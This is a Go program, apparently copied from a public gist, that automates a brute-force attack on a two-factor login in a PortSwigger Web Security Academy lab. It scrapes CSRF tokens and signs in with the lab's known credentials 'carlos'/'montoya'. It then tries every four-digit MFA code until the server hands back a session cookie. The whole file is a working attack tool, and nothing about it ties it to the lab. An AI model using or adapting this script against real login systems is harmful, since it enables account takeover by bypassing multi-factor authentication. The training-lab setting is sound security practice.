// the code below has been copied from:
// https://gist.github.com/ChrisPritchard/87e8342391a9a30f16d91451ce54e8ca

package main

import (
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"reflect"
	"strconv"
	"strings"
)

var (
	username                  = "carlos"
	password                  = "montoya"
	num_of_digits_in_mfa_code = 4
	mfa_code_min              = 1
	mfa_code_max              = 9999
	threads                   = 1
	finished                  = false
	csrfTag                   = "<input required type=\"hidden\" name=\"csrf\" value=\""
	csrf_token_length         = 32
	main_url                  = "https://0a49008604d2259e847d9f8200cc0023.web-security-academy.net" // should NOT end with "/"

	client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

func main() {
	done := make(chan bool)
	for mfa_code := 0; mfa_code <= mfa_code_max && !finished; mfa_code += threads {
		for i := mfa_code; i < mfa_code+threads; i++ {
			go flow(padCode(i), done)
		}
		for i := mfa_code; i < mfa_code+threads; i++ {
			<-done
		}
	}
}

func padCode(code int) string {
	mfa := strconv.Itoa(code)
	for len(mfa) < num_of_digits_in_mfa_code {
		mfa = "0" + mfa
	}
	return mfa
}

func flow(code string, done chan bool) {
	cookie, csrf, err := getLogin()
	if err != nil {
		log.Fatalln(err)
	}

	cookie, err = postLogin(cookie, csrf)
	if err != nil {
		log.Fatalln(err)
	}

	csrf, err = getLogin2(cookie)
	if err != nil {
		log.Fatalln(err)
	}

	successCookie, foundCode, err := postLogin2(cookie, csrf, code)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Println(code)
	if successCookie != "" {
		fmt.Println("==========")
		log.Println(successCookie)
		log.Println(foundCode)
		finished = true
	}
	done <- true
}

func getLogin() (cookie, csrf string, err error) {
	resp, err := http.Get(main_url + "/login")
	if err != nil {
		return "", "", err
	}
	if resp.StatusCode != 200 {
		return "", "", fmt.Errorf("get login response was not 200 (was %d)", resp.StatusCode)
	}
	defer resp.Body.Close()

	cookieSet := resp.Header.Get("Set-Cookie")
	cookie = cookieSet[:40]

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}

	html := string(bodyBytes)

	csrfStart := strings.Index(html, csrfTag)
	if csrfStart == -1 {
		return "", "", errors.New("can't find csrf")
	}

	csrfStart += len(csrfTag)
	csrfEnd := csrfStart + csrf_token_length
	csrf = html[csrfStart:csrfEnd]

	return cookie, csrf, nil
}

func postLogin(cookie, csrf string) (nextCookie string, err error) {
	data := strings.NewReader(fmt.Sprintf("csrf=%s&username=%s&password=%s", csrf, username, password))
	req, _ := http.NewRequest(http.MethodPost, main_url+"/login", data)
	req.Header.Add("Cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != 302 {
		return "", fmt.Errorf("post login response was not 302 (was %d)", resp.StatusCode)
	}
	defer resp.Body.Close()

	cookieSet := resp.Header.Get("Set-Cookie")
	cookie = cookieSet[:40]

	return cookie, nil
}

func getLogin2(cookie string) (csrf string, err error) {
	req, _ := http.NewRequest(http.MethodGet, main_url+"/login2", nil)
	req.Header.Add("Cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("get login2 response was not 200 (was %d)", resp.StatusCode)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	html := string(bodyBytes)

	csrfStart := strings.Index(html, csrfTag)
	if csrfStart == -1 {
		return "", errors.New("can't find csrf")
	}

	csrfStart += len(csrfTag)
	csrfEnd := csrfStart + csrf_token_length
	csrf = html[csrfStart:csrfEnd]

	return csrf, nil
}

func postLogin2(cookie, csrf, code string) (successCookie, foundCode string, err error) {
	data := strings.NewReader(fmt.Sprintf("csrf=%s&mfa-code=%s", csrf, code))
	req, _ := http.NewRequest(http.MethodPost, main_url+"/login2", data)
	req.Header.Add("Cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	if resp.StatusCode != 302 {
		return "", "", nil
	}
	defer resp.Body.Close()

	//
	for _, key := range reflect.ValueOf(resp.Header).MapKeys() {
		value := resp.Header[key.String()]
		fmt.Println("Key:", key, "; Value:", value)
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}

	html := string(bodyBytes)
	fmt.Println(html)
	//

	cookieSet := resp.Header.Get("Set-Cookie")
	cookie = cookieSet[8:40]

	return cookie, code, nil
}

